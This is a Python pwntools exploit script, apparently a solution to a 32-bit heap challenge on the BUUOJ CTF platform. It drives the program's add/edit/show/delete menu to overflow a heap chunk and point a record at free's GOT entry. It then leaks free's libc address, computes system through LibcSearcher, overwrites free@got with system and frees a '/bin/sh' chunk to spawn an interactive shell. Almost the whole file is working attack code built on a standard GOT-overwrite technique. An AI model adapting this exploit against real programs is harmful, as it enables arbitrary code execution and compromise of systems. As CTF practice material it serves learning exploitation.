from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

# context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='i386', log_level='debug')
binary = './1'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,name,text_length,text_content):
    sla(b':',b'0')
    sla(b':',int2bytes(len))
    sla(b'name: ',name)
    sla(b'text length: ', int2bytes(text_length))
    sla(b':', text_content)


def show(index):
    sla(b':',b'2')
    sla(b':',int2bytes(index))

def edit(index,text_length,text_content):  #本题edit的第二个参数是用于检查的不是用于创建chunk大小的
    sla(b':',b'3')
    sla(b':',int2bytes(index))
    sla(b'text length: ', int2bytes(text_length))
    sla(b':', text_content)

def delete(index):
    sla(b':',b'1')
    sla(b':',int2bytes(index))

free_got=elf.got['free']

add(0x80,b'name1',0x80,b'text1') #0
add(0x80,b'name2',0x80,b'text2') #1
add(0x80,b'name3',0x80,b'/bin/sh\x00') #2
# dbg()
delete(0)
# dbg()
add(0x100,b'name1',0x100,b'text1')
payload = b'a'*0x198 + p32(free_got)
edit(3,0x200,payload)
show(1)
ru(b'description: ')
free_addr = u32(r(4))
system_addr,_ = ret2libc(free_addr,'free')

edit(1, 0x4, p32(system_addr))
delete(2)
itr()